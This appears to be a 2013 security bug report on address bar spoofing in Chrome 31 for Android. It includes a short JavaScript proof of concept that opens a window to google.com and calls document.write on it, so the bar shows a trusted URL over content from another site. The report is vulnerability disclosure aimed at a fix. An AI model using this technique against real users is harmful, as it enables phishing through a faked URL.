# Security: Address bar spoofing in Chrome for Android

> Reported by lpil...@gmail.com, Dec 2 2013 Back to list

## VULNERABILITY DETAILS

It is possible to spoof address bar content by opening a window and immediately writing to that window with document.write(). The address bar is filled with initial URL and not updated on document.write(), which cancels the navigation.

## VERSION

Chrome Version: 31.0.1650.59 stable
Operating System: Android 4.0.4; ST21i Build/11.0.A.4.22

## REPRODUCTION CASE

PoC: http://runic.pl/testy/android/chrome-31-abs.html

``` html
<script>
function test01() {
        pop = window.open('https:/www.google.com', '_t1');
        pop.document.write('<script>document.write(document.location.toString().replace("<","&lt;")+"<br>")</scr'+'ipt>');
}
</script>

<input type="button" onclick="test01()" value="Run">
```

## RESULT

"https://www.google.com" in address bar
"http://runic.pl/testy/android/chrome-31-abs.html" in page content
